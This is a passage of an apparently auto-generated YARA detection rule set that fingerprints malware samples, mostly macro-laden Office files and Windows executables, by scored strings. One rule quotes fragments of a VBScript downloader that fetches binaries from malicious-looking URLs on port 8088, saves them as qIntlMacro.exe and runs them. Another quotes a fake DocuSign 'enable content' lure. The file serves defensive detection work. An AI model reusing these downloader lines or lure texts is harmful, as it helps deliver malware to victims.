      $s9 = "W- fqL -" fullword ascii /* score: '9.00'*/
      $s10 = "word/header1.xmlPK" fullword ascii /* score: '9.00'*/
      $s11 = "P^=T:\\" fullword ascii /* score: '7.00'*/
      $s12 = "BT:\"13" fullword ascii /* score: '7.00'*/
      $s13 = "word/media/image1.png" fullword ascii /* score: '7.00'*/
      $s14 = "word/vbaData.xml" fullword ascii /* score: '7.00'*/
      $s15 = "Be:\",h" fullword ascii /* score: '7.00'*/
      $s16 = "docProps/core.xml" fullword ascii /* score: '7.00'*/
      $s17 = "word/vbaProject.binPK" fullword ascii /* score: '7.00'*/
      $s18 = "zV:\\r*" fullword ascii /* score: '7.00'*/
      $s19 = "word/footer1.xml" fullword ascii /* score: '7.00'*/
      $s20 = "7X:\\TVMZ" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 10000KB and
      8 of them
}

rule c977b861b887a09979d4e1ef03d5f975f297882c30be38aba59251f1b46c2aa8 {
   meta:
      description = "dataset - file c977b861b887a09979d4e1ef03d5f975f297882c30be38aba59251f1b46c2aa8"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "c977b861b887a09979d4e1ef03d5f975f297882c30be38aba59251f1b46c2aa8"
   strings:
      $s1 = "word/embeddings/oleObject1.bin" fullword ascii /* score: '10.00'*/
      $s2 = "word/embeddings/oleObject2.bin" fullword ascii /* score: '10.00'*/
      $s3 = "* qAQ<\"!J" fullword ascii /* score: '9.00'*/
      $s4 = "qdlLlDk" fullword ascii /* score: '9.00'*/
      $s5 = "elL.ikh" fullword ascii /* score: '7.00'*/
      $s6 = "word/embeddings/oleObject2.binPK" fullword ascii /* score: '7.00'*/
      $s7 = "g:\"#h\"w" fullword ascii /* score: '7.00'*/
      $s8 = "word/media/image1.emf" fullword ascii /* score: '7.00'*/
      $s9 = "Q:\\_c7" fullword ascii /* score: '7.00'*/
      $s10 = "T:\\0;i@E%-4" fullword ascii /* score: '7.00'*/
      $s11 = "word/embeddings/oleObject1.binPK" fullword ascii /* score: '7.00'*/
      $s12 = "p0cC$-D" fullword ascii /* score: '6.00'*/
      $s13 = "EyE;Vs" fullword ascii /* score: '6.00'*/
      $s14 = "4%T%wK" fullword ascii /* score: '5.00'*/
      $s15 = "MwXew93" fullword ascii /* score: '5.00'*/
      $s16 = "-*1- w" fullword ascii /* score: '5.00'*/
      $s17 = "m /JnE" fullword ascii /* score: '5.00'*/
      $s18 = "\\YMlG\\Gbe" fullword ascii /* score: '5.00'*/
      $s19 = "nnRIfy5" fullword ascii /* score: '5.00'*/
      $s20 = "V=^- ;JS%9" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 14000KB and
      8 of them
}

rule dd088962eb9e2a6b6e10114d4aecad1b20ca033f6eba1308eb6c0fcd9905cbee {
   meta:
      description = "dataset - file dd088962eb9e2a6b6e10114d4aecad1b20ca033f6eba1308eb6c0fcd9905cbee"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "dd088962eb9e2a6b6e10114d4aecad1b20ca033f6eba1308eb6c0fcd9905cbee"
   strings:
      $s1 = "docProps/app.xml" fullword ascii /* score: '7.00'*/
      $s2 = "docProps/core.xml}" fullword ascii /* score: '7.00'*/
      $s3 = "docProps/PK" fullword ascii /* score: '4.00'*/
      $s4 = "word/theme/PK" fullword ascii /* score: '4.00'*/
      $s5 = "word/PK" fullword ascii /* score: '4.00'*/
      $s6 = "znzO~47=" fullword ascii /* score: '4.00'*/
      $s7 = "pPLH4&Z4" fullword ascii /* score: '4.00'*/
      $s8 = "word/_rels/PK" fullword ascii /* score: '4.00'*/
      $s9 = "7:7.yFr" fullword ascii /* score: '4.00'*/
      $s10 = "rXFBW`fRIX)" fullword ascii /* score: '4.00'*/
      $s11 = "_rels/PK" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s12 = "word/_rels/document.xml.rels" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s13 = "word/theme/theme1.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s14 = "word/document.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s15 = "word/styles.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s16 = "word/fontTable.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s17 = "word/_rels/document.xml.relsPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s18 = "word/webSettings.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s19 = "word/theme/theme1.xml" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s20 = "word/settings.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
   condition:
      uint16(0) == 0x4b50 and filesize < 40KB and
      8 of them
}

rule e1a0aabc4b0a1b7d381e90cc2ef8e996ceb85dcd9a13b4750d739f6979249c6d {
   meta:
      description = "dataset - file e1a0aabc4b0a1b7d381e90cc2ef8e996ceb85dcd9a13b4750d739f6979249c6d"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "e1a0aabc4b0a1b7d381e90cc2ef8e996ceb85dcd9a13b4750d739f6979249c6d"
   strings:
      $s1 = "xl/vbaProject.bin" fullword ascii /* score: '10.00'*/
      $s2 = "mSpy oI" fullword ascii /* score: '9.00'*/
      $s3 = "xl/vbaProject.binPK" fullword ascii /* score: '7.00'*/
      $s4 = "xl/sharedStrings.xmlPK" fullword ascii /* score: '7.00'*/
      $s5 = "xl/sharedStrings.xml4" fullword ascii /* score: '7.00'*/
      $s6 = "r:\"y_dl" fullword ascii /* score: '7.00'*/
      $s7 = "temqxf" fullword ascii /* score: '5.00'*/
      $s8 = "(4x @- )" fullword ascii /* score: '5.00'*/
      $s9 = "PMX$+ " fullword ascii /* score: '5.00'*/
      $s10 = "]fsZse;*" fullword ascii /* score: '4.00'*/
      $s11 = "=sZwfQi(" fullword ascii /* score: '4.00'*/
      $s12 = ".1.utZ" fullword ascii /* score: '4.00'*/
      $s13 = "DDEks]o" fullword ascii /* score: '4.00'*/
      $s14 = "grKFMS+" fullword ascii /* score: '4.00'*/
      $s15 = "ODEgVBo" fullword ascii /* score: '4.00'*/
      $s16 = "nXufeOvS" fullword ascii /* score: '4.00'*/
      $s17 = "iAZd:ON" fullword ascii /* score: '4.00'*/
      $s18 = ".cGK<K" fullword ascii /* score: '4.00'*/
      $s19 = "RCjKe^T]" fullword ascii /* score: '4.00'*/
      $s20 = "VNsG&9E" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 1000KB and
      8 of them
}

rule sig_4b980e2e1f654cfd0050df8579670eb693070a7e35eb1255f6bf93f13fb5d530 {
   meta:
      description = "dataset - file 4b980e2e1f654cfd0050df8579670eb693070a7e35eb1255f6bf93f13fb5d530"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "4b980e2e1f654cfd0050df8579670eb693070a7e35eb1255f6bf93f13fb5d530"
   strings:
      $s1 = "customXml/itemProps1.xml" fullword ascii /* score: '14.00'*/
      $s2 = "customXml/itemProps3.xml" fullword ascii /* score: '14.00'*/
      $s3 = "customXml/itemProps2.xml" fullword ascii /* score: '14.00'*/
      $s4 = "word/_rels/header1.xml.rels" fullword ascii /* score: '12.00'*/
      $s5 = "word/header1.xml" fullword ascii /* score: '12.00'*/
      $s6 = "word/header2.xml" fullword ascii /* score: '12.00'*/
      $s7 = "word/_rels/header2.xml.rels" fullword ascii /* score: '12.00'*/
      $s8 = "customXml/itemProps3.xmle" fullword ascii /* score: '11.00'*/
      $s9 = "BDLL(pR" fullword ascii /* score: '9.00'*/
      $s10 = "word/media/image1.png" fullword ascii /* score: '7.00'*/
      $s11 = "docProps/core.xml" fullword ascii /* score: '7.00'*/
      $s12 = "docProps/app.xml" fullword ascii /* score: '7.00'*/
      $s13 = "word/media/image5.png" fullword ascii /* score: '7.00'*/
      $s14 = "customXml/item3.xml" fullword ascii /* score: '7.00'*/
      $s15 = "word/glossary/fontTable.xml" fullword ascii /* score: '7.00'*/
      $s16 = "customXml/_rels/item2.xml.rels" fullword ascii /* score: '7.00'*/
      $s17 = "word/media/image7.jpg" fullword ascii /* score: '7.00'*/
      $s18 = "word/media/image2.svg" fullword ascii /* score: '7.00'*/
      $s19 = "word/media/image9.jpg" fullword ascii /* score: '7.00'*/
      $s20 = "customXml/_rels/item1.xml.rels" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      8 of them
}

rule c90860cbcc78e518dfc11584eb096b7d31eb488f43d5c082b816da54cddfae0f {
   meta:
      description = "dataset - file c90860cbcc78e518dfc11584eb096b7d31eb488f43d5c082b816da54cddfae0f"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "c90860cbcc78e518dfc11584eb096b7d31eb488f43d5c082b816da54cddfae0f"
   strings:
      $s1 = "Click on \"Enable content\" to perform Microsoft Office Decryption Core to start" fullword ascii /* score: '13.00'*/
      $s2 = "DocumentUserPassword" fullword wide /* score: '12.00'*/
      $s3 = "DocumentOwnerPassword" fullword wide /* score: '12.00'*/
      $s4 = "THE FOLLOWING STEPS ARE REQUIRED TO FULLY DECRYPT THE DOCUMENT,ENCRYPTED BY DOCUSIGN." fullword ascii /* score: '11.00'*/
      $s5 = "Click on \"Enable editing\" to unlock the document downloaded from the Internet." fullword ascii /* score: '10.00'*/
      $s6 = "Click on \"Enable editing\" to unlock the editing document downloaded from the internet." fullword ascii /* score: '10.00'*/
      $s7 = "UniresDLL" fullword ascii /* score: '9.00'*/
      $s8 = "onnminimmkmm" fullword ascii /* score: '8.00'*/
      $s9 = "drs/shapexml.xml" fullword ascii /* score: '7.00'*/
      $s10 = "drs/downrev.xml\\" fullword ascii /* score: '7.00'*/
      $s11 = "VIDATHK" fullword ascii /* score: '6.50'*/
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE" wide /* score: '6.50'*/
      $s13 = "AAFAAAAAAAAAAAACGGGAGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE" fullword wide /* score: '6.50'*/
      $s14 = "AAAAAAAAAAAAAAACGGGAGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE" fullword wide /* score: '6.50'*/
      $s15 = "AAHAAAAAAAAAAAAAAACCGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE" fullword wide /* score: '6.50'*/
      $s16 = "AAIIJIIIIIIIIKIIIIIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE" fullword wide /* score: '6.50'*/
      $s17 = "AAIIJIIIIIIIIIIIIIIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE" fullword wide /* score: '6.50'*/
      $s18 = "AAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE" fullword wide /* score: '6.50'*/
      $s19 = "AAJIIIIJIIIIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE" fullword wide /* score: '6.50'*/
      $s20 = "AAIIIIIIIIIIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE" fullword wide /* score: '6.50'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 400KB and
      8 of them
}

rule sig_18c55bf653816c7ad10210a04085658e6d7919ad041061387647bdda9549917a {
   meta:
      description = "dataset - file 18c55bf653816c7ad10210a04085658e6d7919ad041061387647bdda9549917a"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "18c55bf653816c7ad10210a04085658e6d7919ad041061387647bdda9549917a"
   strings:
      $s1 = "    qHide.Exec(qHide.ExpandEnvironmentStrings(\"%ALLUSERSPROFILE%\") & \"\\qIntlMacro.exe\")" fullword ascii /* score: '30.00'*/
      $s2 = "8/fonts/file12.bin\",\"http://insiderushings.com:8088/plugins/file4.bin\",\"http://webservicesamazin.com:8088/js/file10.bin\",\"" ascii /* score: '20.00'*/
      $s3 = "For Each qPivotTableVersion10 in Array(\"http://paymentadvisry.com:8088/plugins/file1.bin\",\"http://jeromfastsolutions.com:8088" ascii /* score: '20.00'*/
      $s4 = "onlinefastsolutions.com:8088/images/file1.bin\",\"http://paymentadvisry.com:8088/css/file2.bin\",\"http://jeromfastsolutions.com" ascii /* score: '20.00'*/
      $s5 = "        .savetofile qHide.ExpandEnvironmentStrings(\"%ALLUSERSPROFILE%\") & \"\\qIntlMacro.exe\", 2 " fullword ascii /* score: '18.00'*/
      $s6 = "For Each qPivotTableVersion10 in Array(\"http://paymentadvisry.com:8088/plugins/file1.bin\",\"http://jeromfastsolutions.com:8088" ascii /* score: '17.00'*/
      $s7 = "    qDialogWorkbookProtect.setRequestHeader \"User-Agent\", \"qIntlAddIn\"" fullword ascii /* score: '17.00'*/
      $s8 = "nts/file13.bin\",\"http://jeromfastsolutions.com:8088/styles/file12.bin\",\"http://paymentadvisry.com:8088/fonts/file1.bin\",\"h" ascii /* score: '17.00'*/
      $s9 = "/jeromfastsolutions.com:8088/bundle/file8.bin\")" fullword ascii /* score: '14.00'*/
      $s10 = "    qDialogWorkbookProtect.Open \"GET\", qPivotTableVersion10, False" fullword ascii /* score: '12.00'*/
      $s11 = "<script type=\"text/vbscript\" LANGUAGE=\"VBScript\" >" fullword ascii /* score: '10.00'*/
      $s12 = "    Set qDialogWorkbookProtect = createobject(\"MSXML2.ServerXMLHTTP.6.0\")" fullword ascii /* score: '7.00'*/
      $s13 = "riving to win his own life and the return of his company. Nay, but even so he saved not his company, though he desired it sore. " ascii /* score: '7.00'*/
      $s14 = "    Set qHide = CreateObject(\"Wscript.Shell\")" fullword ascii /* score: '7.00'*/
      $s15 = "    'Tell me, Muse, of that man, so ready at need, who wandered far and wide, after he had sacked the sacred citadel of Troy, an" ascii /* score: '5.00'*/
      $s16 = "    qDialogWorkbookProtect.Send" fullword ascii /* score: '4.00'*/
      $s17 = "WINDOWSTATE=\"minimize\"" fullword ascii /* score: '4.00'*/
      $s18 = "MINIMIZEBUTTON=\"no\"" fullword ascii /* score: '4.00'*/
      $s19 = "For through the blindness of their own hearts they perished, fools, who devoured the oxen of Helios Hyperion: but the god took f" ascii /* score: '4.00'*/
      $s20 = "d many were the men whose towns he saw and whose mind he learnt, yea, and many the woes he suffered in his heart on the deep, st" ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 20KB and
      8 of them
}

rule sig_497d09f6c3c196363146db34bee6deaa5fc02fea4bef8803ae0c928916954d99 {
   meta:
      description = "dataset - file 497d09f6c3c196363146db34bee6deaa5fc02fea4bef8803ae0c928916954d99"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "497d09f6c3c196363146db34bee6deaa5fc02fea4bef8803ae0c928916954d99"
   strings:
      $s1 = "\\e.Xwb" fullword ascii /* score: '5.00'*/
      $s2 = "indyda" fullword ascii /* score: '5.00'*/
      $s3 = "snedea" fullword ascii /* score: '5.00'*/
      $s4 = "# $Z$4" fullword ascii /* score: '5.00'*/
      $s5 = "KgahO'!n<C9j" fullword ascii /* score: '4.00'*/
      $s6 = "pzfa%LPa" fullword ascii /* score: '4.00'*/
      $s7 = "Igac1b(`" fullword ascii /* score: '4.00'*/
      $s8 = "eIwxkIw" fullword ascii /* score: '4.00'*/
      $s9 = "_HgaXHwa" fullword ascii /* score: '4.00'*/
      $s10 = "HgaB(Tb" fullword ascii /* score: '4.00'*/
      $s11 = "eJHf`b<" fullword ascii /* score: '4.00'*/
      $s12 = "qoahuGw" fullword ascii /* score: '4.00'*/
      $s13 = "HgnTL&D" fullword ascii /* score: '4.00'*/
      $s14 = "HgnTL&B" fullword ascii /* score: '4.00'*/
      $s15 = "Hgng1ea" fullword ascii /* score: '4.00'*/
      $s16 = "{dqYHgac" fullword ascii /* score: '4.00'*/
      $s17 = "eVga`6wa" fullword ascii /* score: '4.00'*/
      $s18 = "DGnfLea" fullword ascii /* score: '4.00'*/
      $s19 = "QIwqPIw" fullword ascii /* score: '4.00'*/
      $s20 = "KgaB(tb" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule sig_87d63a41603486863096c870e9c88355c6299a7f077e3bbf08dbb823d2e7fb6f {
   meta:
      description = "dataset - file 87d63a41603486863096c870e9c88355c6299a7f077e3bbf08dbb823d2e7fb6f"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "87d63a41603486863096c870e9c88355c6299a7f077e3bbf08dbb823d2e7fb6f"
   strings:
      $s1 = "zFSPyFS" fullword ascii /* score: '9.00'*/
      $s2 = "zeE.gdE" fullword ascii /* score: '7.00'*/
      $s3 = "HANPIANP" fullword ascii /* score: '6.50'*/
      $s4 = "vcczvcc3" fullword ascii /* score: '5.00'*/
      $s5 = "racxzac9" fullword ascii /* score: '5.00'*/
      $s6 = "7: iT* " fullword ascii /* score: '5.00'*/
      $s7 = "nboznbo2" fullword ascii /* score: '5.00'*/
      $s8 = "/ANP.ANPxANPxANP" fullword ascii /* score: '4.00'*/
      $s9 = "PsaxH$)" fullword ascii /* score: '4.00'*/
      $s10 = "zNPzzNPzzNPJ" fullword ascii /* score: '4.00'*/
      $s11 = "*SoMkC*~" fullword ascii /* score: '4.00'*/
      $s12 = "rANPsANP" fullword ascii /* score: '4.00'*/
      $s13 = "ZaeO/h!" fullword ascii /* score: '4.00'*/
      $s14 = "`ANPaANP" fullword ascii /* score: '4.00'*/
      $s15 = "~dpgqtxT" fullword ascii /* score: '4.00'*/
      $s16 = "5JTZQntZ" fullword ascii /* score: '4.00'*/
      $s17 = "ANPFANPFANP>`M" fullword ascii /* score: '4.00'*/
      $s18 = "xlKP<H{" fullword ascii /* score: '4.00'*/
      $s19 = "hoqiq\\" fullword ascii /* score: '4.00'*/
      $s20 = "zNPXzNPXzNP" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x48fc and filesize < 800KB and
      8 of them
}

rule LLVM_Cookbook {
   meta:
      description = "dataset - file LLVM Cookbook.pdf"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "188ffec7e2c73dcc799b39d30abdb61ca0286633379a97439e3ab906893d00af"
   strings:
      $s1 = "/URI (https://www.packtpub.com/books/content/support)" fullword ascii /* score: '25.00'*/
      $s2 = "/URI (https://kripken.github.io/emscripten-site/docs/getting_started/downloads.html)" fullword ascii /* score: '24.00'*/
      $s3 = "/URI (https://www2.packtpub.com/books/subscription/packtlib)" fullword ascii /* score: '23.00'*/
      $s4 = "/URI (https://github.com/kripken/emscripten)" fullword ascii /* score: '23.00'*/
      $s5 = "/URI (https://www.packtpub.com/sites/default/files/downloads/5981OS_ColorImages.pdf)" fullword ascii /* score: '23.00'*/
      $s6 = "    <rdf:Description xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmlns:xmpidq=\"http://ns.adobe.com/xmp/Identifier/qual/1.0/\" rd" ascii /* score: '21.00'*/
      $s7 = "    <rdf:Description xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmlns:xmpidq=\"http://ns.adobe.com/xmp/Identifier/qual/1.0/\" rd" ascii /* score: '21.00'*/
      $s8 = "/URI (https://code.google.com/p/address-sanitizer/wiki/LeakSanitizer)" fullword ascii /* score: '20.00'*/
      $s9 = "/URI (http://www.packtpub.com/support)" fullword ascii /* score: '20.00'*/
      $s10 = "/URI (http://www.packtpub.com/authors)" fullword ascii /* score: '20.00'*/
      $s11 = "/URI (http://llvm.org/docs/CommandGuide/opt.html)" fullword ascii /* score: '18.00'*/
      $s12 = "    <rdf:Description xmlns:pdfx=\"http://ns.adobe.com/pdfx/1.3/\" rdf:about=\"\"/>" fullword ascii /* score: '18.00'*/
      $s13 = "/URI (http://www.packtpub.com)" fullword ascii /* score: '17.00'*/
      $s14 = "/URI (mailto:service@packtpub.com)" fullword ascii /* score: '17.00'*/
      $s15 = "/URI (http://www.PacktPub.com)" fullword ascii /* score: '17.00'*/
      $s16 = "/URI (http://www.packtpub.com/submit-errata)" fullword ascii /* score: '17.00'*/
      $s17 = "/URI (https://github.com/go-llvm/llgo)" fullword ascii /* score: '17.00'*/
      $s18 = "Conversion from target-independent DAG to machine DA" fullword wide /* score: '17.00'*/
      $s19 = "Describing targets using TableGe" fullword wide /* score: '17.00'*/
      $s20 = "/URI (http://www.graphviz.org/Download.php)" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5025 and filesize < 9000KB and
      8 of them
}

rule sig_7c4ec96ba82e79cb37c6829a595dc09b76568a5dadd82c743c3f9a69c985ad83 {
   meta:
      description = "dataset - file 7c4ec96ba82e79cb37c6829a595dc09b76568a5dadd82c743c3f9a69c985ad83"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7c4ec96ba82e79cb37c6829a595dc09b76568a5dadd82c743c3f9a69c985ad83"
   strings:
      $s1 = "eppeedf.dll" fullword ascii /* score: '23.00'*/
      $s2 = "self.exe" fullword wide /* score: '22.00'*/
      $s3 = " testapp.exe" fullword wide /* score: '19.00'*/
      $s4 = "wv.exe" fullword wide /* score: '16.00'*/
      $s5 = "pdmmgree.pdb" fullword ascii /* score: '14.00'*/
      $s6 = "L$D+D$D" fullword ascii /* reversed goodware string 'D$D+D$L' */ /* score: '11.00'*/
      $s7 = "2!2*20262<2" fullword ascii /* score: '9.00'*/ /* hex encoded string '" &"' */
      $s8 = "LdrGetProcedureAk" fullword ascii /* score: '9.00'*/
      $s9 = "ntdll.dl" fullword wide /* score: '9.00'*/
      $s10 = "kernel320due3fromj" fullword wide /* score: '9.00'*/
      $s11 = "content2,the7" fullword wide /* score: '9.00'*/
      $s12 = "blogstarting7channelPConcurrently," fullword wide /* score: '9.00'*/
      $s13 = "2, 9, 0, 0" fullword wide /* score: '9.00'*/ /* hex encoded string ')' */
      $s14 = ": :/:>:M:\\:" fullword ascii /* score: '7.00'*/
      $s15 = "austinXDublin.engine.135" fullword wide /* score: '7.00'*/
      $s16 = "also4InzmickeyofS" fullword wide /* score: '7.00'*/
      $s17 = "JwebsiteTWwebsite5versionq" fullword wide /* score: '7.00'*/
      $s18 = "CHENGDU YIWO Tech Development Co., Ltd (YIWO Tech Ltd, for short)." fullword wide /* score: '6.00'*/
      $s19 = "Copyright (c)2006-2008 CHENGDU YIWO Tech Development Co., Ltd." fullword wide /* score: '6.00'*/
      $s20 = "\\OluJ(uZ" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule sig_9af4b3b8c67d21fef69dee132cb686d1cb9e34e2d5e807b05c2a92e48f08dd39 {
   meta:
      description = "dataset - file 9af4b3b8c67d21fef69dee132cb686d1cb9e34e2d5e807b05c2a92e48f08dd39"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "9af4b3b8c67d21fef69dee132cb686d1cb9e34e2d5e807b05c2a92e48f08dd39"
   strings:
      $s1 = "eppeedf.dll" fullword ascii /* score: '23.00'*/
      $s2 = "self.exe" fullword wide /* score: '22.00'*/
      $s3 = " testapp.exe" fullword wide /* score: '19.00'*/
      $s4 = "wv.exe" fullword wide /* score: '16.00'*/
      $s5 = "pdmmgree.pdb" fullword ascii /* score: '14.00'*/
      $s6 = "L$D+D$D" fullword ascii /* reversed goodware string 'D$D+D$L' */ /* score: '11.00'*/
      $s7 = "2!2*20262<2" fullword ascii /* score: '9.00'*/ /* hex encoded string '" &"' */
      $s8 = "LdrGetProcedureAk" fullword ascii /* score: '9.00'*/
      $s9 = "ntdll.dl" fullword wide /* score: '9.00'*/
      $s10 = "kernel320due3fromj" fullword wide /* score: '9.00'*/
      $s11 = "content2,the7" fullword wide /* score: '9.00'*/
      $s12 = "blogstarting7channelPConcurrently," fullword wide /* score: '9.00'*/
      $s13 = "2, 9, 0, 0" fullword wide /* score: '9.00'*/ /* hex encoded string ')' */
      $s14 = ": :/:>:M:\\:" fullword ascii /* score: '7.00'*/
      $s15 = "austinXDublin.engine.135" fullword wide /* score: '7.00'*/
      $s16 = "also4InzmickeyofS" fullword wide /* score: '7.00'*/
      $s17 = "JwebsiteTWwebsite5versionq" fullword wide /* score: '7.00'*/
      $s18 = "CHENGDU YIWO Tech Development Co., Ltd (YIWO Tech Ltd, for short)." fullword wide /* score: '6.00'*/
      $s19 = "Copyright (c)2006-2008 CHENGDU YIWO Tech Development Co., Ltd." fullword wide /* score: '6.00'*/
      $s20 = "\\OluJ(uZ" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule sig_923de5fc24a860522375e93ea09e4298e5a1dfaa6a17c61754162aa3d4339bce {
   meta:
      description = "dataset - file 923de5fc24a860522375e93ea09e4298e5a1dfaa6a17c61754162aa3d4339bce"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "923de5fc24a860522375e93ea09e4298e5a1dfaa6a17c61754162aa3d4339bce"
   strings:
      $s1 = "eppeedf.dll" fullword ascii /* score: '23.00'*/
      $s2 = "self.exe" fullword wide /* score: '22.00'*/
      $s3 = " testapp.exe" fullword wide /* score: '19.00'*/
      $s4 = "wv.exe" fullword wide /* score: '16.00'*/
      $s5 = "pdmmgree.pdb" fullword ascii /* score: '14.00'*/
      $s6 = "L$D+D$D" fullword ascii /* reversed goodware string 'D$D+D$L' */ /* score: '11.00'*/
      $s7 = "2!2*20262<2" fullword ascii /* score: '9.00'*/ /* hex encoded string '" &"' */
      $s8 = "LdrGetProcedureAk" fullword ascii /* score: '9.00'*/
      $s9 = "ntdll.dl" fullword wide /* score: '9.00'*/
      $s10 = "kernel320due3fromj" fullword wide /* score: '9.00'*/
      $s11 = "content2,the7" fullword wide /* score: '9.00'*/
      $s12 = "blogstarting7channelPConcurrently," fullword wide /* score: '9.00'*/
      $s13 = "2, 9, 0, 0" fullword wide /* score: '9.00'*/ /* hex encoded string ')' */
      $s14 = ": :/:>:M:\\:" fullword ascii /* score: '7.00'*/
      $s15 = "austinXDublin.engine.135" fullword wide /* score: '7.00'*/
      $s16 = "also4InzmickeyofS" fullword wide /* score: '7.00'*/
      $s17 = "JwebsiteTWwebsite5versionq" fullword wide /* score: '7.00'*/
      $s18 = "CHENGDU YIWO Tech Development Co., Ltd (YIWO Tech Ltd, for short)." fullword wide /* score: '6.00'*/
      $s19 = "Copyright (c)2006-2008 CHENGDU YIWO Tech Development Co., Ltd." fullword wide /* score: '6.00'*/
      $s20 = "\\OluJ(uZ" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule sig_956e66f820c127b655c4e59af455c4cc827d43b111f4cf260b6da1d30ac443b2 {
   meta:
      description = "dataset - file 956e66f820c127b655c4e59af455c4cc827d43b111f4cf260b6da1d30ac443b2"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "956e66f820c127b655c4e59af455c4cc827d43b111f4cf260b6da1d30ac443b2"
   strings:
      $s1 = "eppeedf.dll" fullword ascii /* score: '23.00'*/
      $s2 = "self.exe" fullword wide /* score: '22.00'*/
      $s3 = " testapp.exe" fullword wide /* score: '19.00'*/
      $s4 = "wv.exe" fullword wide /* score: '16.00'*/
      $s5 = "pdmmgree.pdb" fullword ascii /* score: '14.00'*/
      $s6 = "L$D+D$D" fullword ascii /* reversed goodware string 'D$D+D$L' */ /* score: '11.00'*/
      $s7 = "2!2*20262<2" fullword ascii /* score: '9.00'*/ /* hex encoded string '" &"' */
      $s8 = "LdrGetProcedureAk" fullword ascii /* score: '9.00'*/
      $s9 = "ntdll.dl" fullword wide /* score: '9.00'*/
      $s10 = "kernel320due3fromj" fullword wide /* score: '9.00'*/
      $s11 = "content2,the7" fullword wide /* score: '9.00'*/
      $s12 = "blogstarting7channelPConcurrently," fullword wide /* score: '9.00'*/
      $s13 = "2, 9, 0, 0" fullword wide /* score: '9.00'*/ /* hex encoded string ')' */
      $s14 = ": :/:>:M:\\:" fullword ascii /* score: '7.00'*/
      $s15 = "austinXDublin.engine.135" fullword wide /* score: '7.00'*/
      $s16 = "also4InzmickeyofS" fullword wide /* score: '7.00'*/
      $s17 = "JwebsiteTWwebsite5versionq" fullword wide /* score: '7.00'*/
      $s18 = "CHENGDU YIWO Tech Development Co., Ltd (YIWO Tech Ltd, for short)." fullword wide /* score: '6.00'*/
      $s19 = "Copyright (c)2006-2008 CHENGDU YIWO Tech Development Co., Ltd." fullword wide /* score: '6.00'*/
      $s20 = "\\OluJ(uZ" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule sig_13c557ea66a10b9198bb66451ea9b7428f284265b3c6c51c28612bea3c7a04f4 {
   meta:
      description = "dataset - file 13c557ea66a10b9198bb66451ea9b7428f284265b3c6c51c28612bea3c7a04f4"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
